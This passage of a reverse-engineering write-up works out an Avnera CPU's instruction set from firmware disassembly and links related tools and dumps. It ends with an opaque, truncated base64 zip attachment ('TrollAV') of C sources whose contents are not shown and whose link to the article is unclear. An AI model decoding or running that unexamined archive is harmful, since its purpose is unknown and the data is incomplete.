+--[ whittling down the last few opcodes...
+
+OK. short list of remaining instructions. motivation and optimism are 
+starting to fade.. but i want to figure out as many as possible.
+
+[: 48..4f :]
+
+it seems like 48..4f has some kind of a lead here:
+
+    e878b4 e979b4 ec70ef 59 4c 74 11 e971ef 49 71 14 c977b4
+
+which at first only looks interesting for its use of the very uncommon opcode 
+4c. structuring that slightly differently makes some of the relationships a 
+little more clear:
+
+    e878b4 e979b4       ; r0:r1 <- [0xb478:0xb479]
+    ec70ef 59 4c 74 11  ; r4 <- [0xef70]; ???; ???; r0 -> r4; r1 -> r0
+    e971ef 49 71 14     ; r1 <- [0xef71]; ???; r0 -> r1; r4 -> r0
+    c977b4 c876b4       ; [0xb477:0xb478] <- r0:r1
+
+the 4c and 49 operations clearly modify r0. 59 might modify a register or 
+do something else; if it modifies a register, it's probably r1 which is used 
+later. it seems like r1 is the high byte of a 16b integer, so an operation 
+directly on that byte seems a little unlikely. 59 might be a mirror of 69 
+(clear carry flag), setting the carry flag instead? 
+
+as for 49 and 4c, best guesses are heavily informed by what i already know: 
+this isn't adc, or, and, add, rotate left or right, ... but given the seeming 
+16b value being operated on, maybe these are sbc. that would mean with 59 
+being set cf, this is computing something like *0xb479 -= *0xef70 + 1.
+
+this isn't a lot to go on for sbc, but double-checking a different function, 
+it's at least coherent:
+
+    e8e8ed 9841
+      e103 fe01 79 9807
+        e102 fe01 79
+      9022
+      ea03ee eb04ee
+      e058 e11b
+      59 4a 72                    ; ??? ; sbc r0, r2; r0 -> r2
+      11 4b 73                    ; r1 -> r0 ; sbc r0, r3; r0 -> r3
+      e8deee 7a e8dfee 4b 9108    ; r0 <- [0xeede]; r0 -= r2; r0 <- [0xeedf]
+                                  ;  sbc r0, r3; jc $+8
+        bf27c5 e400 bff4dd
+      e102 fe01 79 9803
+        bc05c7
+      28 c8e8ed bc05c7
+    e101 fe01
+    79 9008
+
+i've marked up the most relevant lines: 59 is a leader again, and r1 is 
+used here, but if 59 modifies r1 then, again, it's something that makes 
+sense to do first and only to the upper byte of a 16bit number. r2:r3 
+seem subtracted into, and with the load; sub; load; sbc; jc sequence 
+this implements something like if (r2:r3 - 0x1b58 >= [0xeede:0xeedf])
+
+[: 59 ... or a wild guess towards 58..5f? :]
+
+going to also assume that 59 is set carry flag, since no other 58..5f 
+instructions seem to be present here.. this mirrors 69 as well.
+
+[: 60..67 ... where possible :]
+
+61 shows up before conditional branches, usually after loading from 0xf303..? 
+is that maybe a gpio address? 60 and 62 are also present .... here:
+
+    fe07 72 fe08 73 fa04 c875ed fa03 c874ed e850f1 62 9003 bceacc e852f1 
+    60 9003 bceacc e400 bf67c5 bceacc
+
+... is 60..67 something like "extract bit N of r0"? r0 is typically loaded 
+before it's executed, and conditional branches are always present after. 
+probably not consuming an rN and probably modifies r0 for the condition. 
+difficult to imagine another purpose for a 3-bit field at that point.
+
+[: ba :]
+
+another region i looked at very early on has a "ba" in it at least. it's a 
+remarkably rare opcode, it seems:
+
+    8f 8e 88
+    c8f0b0 88 c8efb0 88 c8eeb0 88 c8edb0 88
+    c8ecb0 88 c8ebb0 88 c8eab0 88 c8e9b0 88
+    c8e8b0 88 c8e7b0 88 c8e6b0
+    8d 8c 8b 8a 89 88
+    bae8f3 b4 c85ced e8f2b4 c85bed
+    b9
+
+... is actually split up wrong, rather than bae8f3 b4, this is ba e8f3b4! 
+matching with the e8f2b4 to load one byte lower a few instructions later. 
+fixed up that looks like this:
+
+    [elided restore of 0xb0e6:0xb0f0]
+    8d 8c 8b 8a 89 88
+    ba
+    
+    e8f3b4 c85ced e8f2b4 c85bed
+    b9
+
+so then this routine is restoring the region of bytes used for 32b x 32b 
+multiply, all registers, then almost-but-not-ret. given the full-restore 
+including scratch memory, this seems like the end of an interrupt routine. 
+so ba is iret? consistent with what might be an ISR return at least. there 
+happens to be another small routine directly after.
+
+[: 00..07 :]
+
+turning all the way back, this pattern gives an idea for 00..07:
+
+    e850ef e951ef   ; r1:r0 <- [0xef51]:[0xef50]
+    e404            ; r4 <- 0x04
+    54              ; r0 += r4
+    9101            ; jnc $+1
+      01            ; ???
+    80              ; push r0
+    f0              ; r0 <- [r1:r0]
+    74              ; r4 <- r0
+    88              ; pop r0
+    f801            ; r0 <- [r1:r0 + 1]
+    75              ; r5 <- r0
+
+or this,
+
+    15 71 14        ; r1:r0 <- r5:r4
+    e304            ; r3 <- 0x04
+    53              ; r0 += r3
+    9101            ; jnc $+1
+      01            ; ???
+    76 11 77        ; r7:r6 <- r1:r0
+
+so here, 01 is only conditionally executed if adding produced a carry out. 
+r0 and r1 seem to be operated on together, so the two might be logically a 
+16-bit integer. so 01 might be inc rN? in that case the carry out is being 
+conditionally added into the higher byte. nothing else has seemed obviously 
+like an inc yet. this seems a little odd on the whole in the first snippet, 
+since the result of addition doesn't seem to be preserved.. r0 is clobbered 
+in the last load. could that whole region have been f805 74 f806 75? this 
+might still be missing some additional behavior.
+
+other uses of 00..07 don't obviously disagree with this though. 
+for example, 00:
+
+    e8eeed 00 c8eeed  ; [0xedee] += 1
+    ...
+    fa03 00 da03      ; [r3:r2 + 3] += 1
+    ...
+    fe04 00 de04      ; [r7:r6 + 4] += 1
+    ...
+    e8c0ee 00 c8c0ee  ; [0xeec0] += 1
+
+so, maybe 00 actually is inc.
+
+--[ mostly done, what's left in the encoding space?
+
+this all is some progress, with not much left unknown. from the earlier list: 
+  * 00..07 - inc rN 
+  * 48..4f - sbc r0, rN 
+  * 58..5f, except 59 (scf) - might be flags manipulation? not present, 
+    either way 
+  * 60..68 - bit r0, N * 68..6f, except 69 (ccf) - might be flags 
+    manipulation? not present, either way 
+  * 78..7f: might be cmp, might be sub. need evidence one way or the other! 
+  * a0..af, seems not-present - a0 is present.. once. 
+  * b0..b7, seems not-present 
+  * b8..bf, except b9, ba, bc (maybe jump?), bf 
+  * c0..c7, which is remarkably rare. c0, c4, c6? 
+  * d0..df, ~except da, de. seen but not understood: db, dc~ d0..d7, evens, 
+    are [rN+1:rN] <- r0 d8..df, evens, are [rN+1:rN + imm] <- r0 db is not 
+    actually present, was a misreading of the program 
+  * f0..ff, ~except fa, fe. seen but not understood: f0, f2, f3, f4, f6~ 
+    f0..f7, evens, are r0 <- [rN+1:rN] f8..ff, evens, are 
+    r0 <- [rN+1:rN + imm] f3 is not actually present, was a misreading of 
+    the program
+
+so.. last questions: 
+
+  * is 78..7f actually sub or cmp? 
+  * what is a0? 
+  * what are c0..c7?
+
+--[ 78..7f ... sub or cmp?
+
+the question really is, "does this instruction modify r0?" - it's possible 
+that the instruction computes sub, stores the result, and the program never 
+actually uses that result, either because subtraction isn't often used or 
+because of a compiler deficiency, something else, whatever. so the best 
+guess here is, "is r0 ever preserved after a 78..7f?" or asked differently,
+"does r0 get preserved/restored around a 78..7f?"
+
+the only hint that 78..7f might clobber r0 comes from regions like this:
+
+    e103 fe01 79 9807          ; r1 <- 3; r0 <- [r7:r6]; sub r0, r1; jz ...
+      e102 fe01 79 9022        ; r1 <- 2; r0 <- [r7:r6]; sub r0, r1; jnz ...
+        ea03ee eb04ee e058 e11b ...
+
+if 79 were cmp and did not modify r0, there wouldn't be a need to reload 
+it in fe01. ... but this may be poor code, and the reload may actually be 
+redundant. since this seems to implement 
+
+    if ([r7:r6] == 3 || [r7:r6] == 2) { .. load registers }
+
+and there are no other signs that 78..7f clobbers r0, this might actually 
+be cmp.
+
+--[ what is a0?
+
+this seems to be the only place a0 is present:
+
+    14 71
+    bcabe6
+    bfd00e        ; call 0xed0 (???)
+    c8bcee        ; [0xeebc] <- r0
+    a0            ; ???
+    72 11 73      ; r3:r2 <- r1:r0
+    fa0b c8bfee   ; [0xeebf] <- [r3:r2 + 0x0b]
+    fa0a c8beee   ; [0xeebe] <- [r3:r2 + 0x0a]
+    e046 40       ; r0 <- 0x46; dec r0 (???)
+    da0a          ; [r3:r2 + 0x0a] <- r0
+    e0e6 9901     ; r0 <- 0xe6; jc $+01
+      40          ; dec r0 (???)
+    da0b          ; [r3:r2 + 0x0b] <- r0
+    b9
+
+whatever it is, it presumably operates on at least r0, writes to r0 and r1. 
+the routine at 0xed0 (outside the image?) may say more about what the 
+registers are at its return, but from this alone it's hard to guess. it 
+is interesting and remarkable that only r0 is saved to [0xeebc], not r1!
+
+--[ what are c0..c7?
+
+these instructions are pretty infrequent. of the few places they show up, this 
+seems like the most informative region to dig into:
+
+    e81ff8 61 903c
+      ea29ef eb2aef   ; r5:r4 <- [0xef2a]:[0xef29]
+      fa08 71 fa07    ; r1:r0 <- [r5:r4 + 8]:[r5:r4 + 7]
+      c0              ; ??
+      74 11 75        ; r5:r4 <- r1:r0
+      12              ; r0 <- r2
+      e92aef          ; r1 <- [0xef2a]
+      e307 53 9101    ; r3 <- 0x07; add r0, r3; jnc $+1
+        01            ; inc r1
+      80 f0 72 88     ; r2 <- [r1:r0]
+      f801 73         ; r3 <- [r1:r0 + 1]
+      f2              ; r0 <- [r3:r2]
+      e1ff 51         ; r0 += 0xff
+      77              ; r7 <- r0
+    e600              ; r6 <- 0
+    9806              ;
+      f4 c88cf8       ; [0xf88c] <- [r5:r4]
+      c4              ; ??
+      06              ; inc r6
+    
+      16 7f           ; r0 <- r6; cmp r0, r7
+    91f6              ; jb $-0x0a
+
+the ending loop makes some sense: load from a 16-bit pointer, store to 
+maybe-IO-register(?), increment r6, repeat until r6 == r7. in other contexts 
+where c0 is used, r1:r0 is recently populated with a 16-bit integer too. so 
+it seems likely that c[0-7] operates on at least rN, maybe rN+1 if it's more 
+like the d_ or f_ two-registers-as-an-address instructions.
+
+if c4 were a load or store it would probably operate with respect to r0 and 
+r4, but r0 is immediately clobbered, so it's probably not a load or otherwise 
+leaving a result in r0. if it were a store this might overwrite a buffer.. 
+somewhere.. with 0, 1, 2, 3, 4, .. <r7>.
+
+looking at the c0 earlier in this block r1:r0 is loaded immediately before, 
+and then read (copied to r5:r4) immediately after. r5:r4 is used for the f4 
+load, so those registers form something like a pointer.
+
+compare with the other use of c4 in this program here:
+
+      e4e3 e5ed   ; r4 <- 0xe3; r5 <- 0xed
+      e28f e301   ; r2 <- 0x8f; r3 <- 0x01
+      28          ; xor r0, r0
+    loop:
+      42 9903     ; dec r2; jnc body
+      43 9105     ; dec r3; jc exit
+    body:
+      d4          ; [r5:r4] <- r0
+      c4          ; ???
+      bc69bb      ; jmp loop
+    exit:
+      bc26be      ; jmp ... somewhere ...
+
+r5:r4 is written through, but the combined `dec r2; jnc body; dec r3; 
+jc exit; ... jmp loop` forms a a loop that repeats until r3:r2 is 
+decremented past zero. the loop body is simply `[r5:r4] <- r0, r0` set to 
+zero, c4 probably operates on r5:r4, and if it modifies r0 then r0 is left 
+in that modified state for the next store through [r5:r4].
+
+looking at other 8-bit processors for inspiration regarding c[0246], it 
+seems plausible that it is in fact an increment for a register pair. in 
+that case, the loop forms a memset, clearing 0x1c0 bytes of memory. this 
+is also almost at the start of the image - not knowing where execution 
+begins, it still seems likely enough that this is related to initialization.
+
+there might not be a corresponding 16-bit decrement instruction? or if there 
+is, like the 8080, it might not set flags; if so, it would not be useful to 
+decrement r3:r2 in this loop because an explicit test for zero would still be 
+necessary.
+
+looking back at the other loop earlier:
+
+    e600              ; r6 <- 0
+    9806              ;
+      f4 c88cf8       ; [0xf88c] <- [r5:r4]
+      c4              ; inc r5:r4
+      06              ; inc r6
+    
+      16 7f           ; r0 <- r6; cmp r0, r7
+    91f6              ; jc $-0x0a
+
+then taking c4 to be inc r5:r4 makes this a loop writing the bytes from a 
+buffer r7 bytes long at r5:r4 into the address f88c. why not decrement r7 
+instead of the inc/mov/compare??
+
+--[ but wait! what happened with jcc?
+
+in writing this up, i flip-flopped on the meaning of 91 and 99 jumps without 
+entirely realizing it. two different regions of code suggest different 
+semantics!
+
+first, the inner multiply loop from earlier:
+
+      e408                  ; r4 <- 8
+    back:
+        69 3d               ; ccf; rcr r5
+        911d                ; jcc.lo.1 forward
+    back:
+    
+          e8eab0 56 c8eab0  ; add [0xb0ea], r6
+          e8ebb0 09 c8ebb0  ; add [0xb0eb], r1
+          e8ecb0 0a c8ecb0  ; add [0xb0eb], r2
+          e8edb0 0b c8edb0  ; add [0xb0eb], r3
+    
+          69                ; ccf
+    forward:
+        36 31 32 33 44    ; ccf; rcl r6:r1:r2:r3; dec r4
+      90d8                ; jnz back
+      b9                  ; ret
+
+where 91 seems like jnc - "jump past adding in the multiplier if the next 
+bit in the multiplicand was 0". but a different loop suggests the opposite 
+reading:
+
+      e4e3 e5ed   ; r4 <- 0xe3; r5 <- 0xed
+      e28f e301   ; r2 <- 0x8f; r3 <- 0x01
+      28          ; xor r0, r0
+    loop:
+      42 9903     ; dec r2; jnc body
+      43 9105     ; dec r3; jc exit
+    body:
+      d4          ; [r5:r4] <- r0
+      c4          ; ???
+      bc69bb      ; jmp loop
+    exit:
+      bc26be      ; jmp ... somewhere ...
+
+where instead it's 99 that looks like a jnc - "if decrementing r2 did not 
+borrow, do not decrement r3 and continue another loop iteration". and 91 
+is what looks like a jc- "if decrementing r3 borrowed, skip past the loop 
+body".
+
+either "jc" and "jnc" are conditional on more than it first seems, or 
+perhaps more likely, dec produces a carry bit any time the result is 
+not zero. as an example:
+
+|  r0  | r0-after-dec | carry |
+|------|--------------|-------|
+| 0x00 | ff + 0 = ff  | 0     |
+| 0x01 | ff + 1 = 00  | 1     |
+| 0x02 | ff + 2 = 01  | 1     |
+| 0xff | ff + ff = fe | 1     |
+
+that would bring this all back together: 99 is jc, 91 is jnc. it's rare that 
+there's a dec; jcc (one other instance in this program at 0x16db), so it's 
+hard to cross-check this interpretation.
+
+--[ last thoughts
+
+in looking at this i was very surprised by how informative loops - especially 
+short loops - are for finding bounds of what a program may or likely does not 
+do. this isn't very surprising in retrospect; short programs don't have 
+opportunities to do very much, and doing the same not-very-much in a loop 
+has even fewer opportunities to do something useful.
+
+loops are usually conditioned on a relatively simple predicate: 
+
+    while x < 10 do { ... }
+    // or 
+    do { ... } while x > 10
+    // or 
+    while x != 0 { x = loop_body() }
+
+a lot of behavior fell out of finding short loops and making sense of the 
+instructions used to drive them.
+
+this definitely applies when you do know the instruction set but are trying 
+to make sense of a larger program - it's just good advice when reverse 
+engineering a program. it's neat to see the idea carry through when you're 
+figuring out the instruction set itself.
+
+additionally: this is doable! what's totally unknown at this point is mostly 
+instructions that don't appear in this program (at which point it's hard to 
+guess about behavior...)
+
+--[ conclusion
+
+that seems to be the ISA, at least as used in this program. this architecture 
+seems like an outsider art re-envisioning of the 8080, with fewer register 
+to register movs, and more indexed memory accesses. it seems interesting that 
+this architecture has loads like [r7:r6] and [r7:r6 + N] but not [r7:r6 + rN].
+having non-offset load/store through a register pair seems a bit out of place 
+in its own right: it's a lot of encoding space to reserve for a relatively 
+rare operation. maybe it's more common in some reference program, and this 
+firmware is the odd one?
+
+a0..af are almost nonexistent here, and may be other 8080-style instructions. 
+b0..b8 are not represented in this program, and would be prime encoding space 
+for conditional returns. it wouldn't be terribly shocking if a compiler 
+didn't know to use conditional returns and instead conditionally branched 
+over returns.
+
+the moment i, at least, have been waiting for, after describing as much of 
+the ISA as possible, is to compare notes with others who have looked at this 
+CPU or programs for it: 
+
+  * whitequark's binja plugin: https://github.com/whitequark/binja-avnera 
+  * several years ago: https://github.com/Prehistoricman/AV7300
+
+... we almost entirely agree! it seems that Prehistoricman tested with a 
+physical CPU, and has some notes for opcodes that are otherwise not present: 
+
+  https://github.com/Prehistoricman/AV7300/blob/master
+    /Instruction%20set%20notes.txt#L195-L198
+
+whitequark records 58..5f and 68..6f as set and clr respectively, which i 
+suspect are the same as i'd understood: set (or clear) a bit in the status 
+register. this is also what Prehistoricman understood them to mean.
+
+i'm pretty surprised how much can be reasonably guessed out from just a 12kb 
+firmware! there are plenty of operational semantics missing in my descriptions 
+above - for example, i know basically nothing about memory addressing: lots of 
+the above leaned on assuming a flat 64kb address space is a decent 
+approximation. 
+
+segmentation would be annoying to figure out! if the ISA were anything more 
+complex it probably would have required more than just staring really hard at 
+notes. an ARM-style encoding with more aggressive packing of bits certainly 
+would have been harder to discover.
+
+if you happen to want to disassemble programs for Avnera processors - it's 
+not at all clear to me which models may have different or extended instruction 
+sets - i've published a disassembler based on the above notes as 
+yaxpeax-avnera. from whitequark's note here it does seem likely this 
+instruction set is common across many models!
+
+--[ summarized materials
+
+[1]: https://www.robertxiao.ca/hacking
+      /dsctf-2019-cpu-adventure-unknown-cpu-reversing/
+
+there are a few more programs reportedly for this architecture here, from 
+Prehistoricman at https://github.com/Prehistoricman/AV7300. mirrored below:
+* https://www.iximeow.net/hof/av7300/base_station_dump.bin
+  - sha256: fe25e7beae845ad68c0003a59c8d1b73d3202521f5d5221fdaf43eb3ebf1babf
+* https://www.iximeow.net/hof/av7300/headset_dump.bin
+  - sha256: 782f3ab95a59ceddfe6d3d475c5c0a31b2d05e1baf2201c1f2f14743e9faa731
+
+the program i reference heavily in this post is mirrored here:
+* https://www.iximeow.net/hof/av7200/noes
+  - sha256: 0f433076bd00381a99c6dd5aabf55653317b4519c2860e944b6090b2f4aa5a9e
+
+whitequark's excellent cheatsheet of the encoding space: 
+* https://github.com/whitequark/binja-avnera/tree
+   /main?tab=readme-ov-file#cheatsheet
+
+and finally, yaxpeax-avnera, the librarified form of the disassembler i built 
+up in parallel with the above research:
+  https://www.github.com/iximeow/yaxpeax-avnera
+
+
+
+|=-----------------------------------------------------------------------=|
+|=-=[ Appendix: File Attachments ]=--------------------------------------=|
+|=-----------------------------------------------------------------------=|
+
+<++> TrollAV.zip.uu
+begin-base64 777 TrollAV.zip.uu
+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
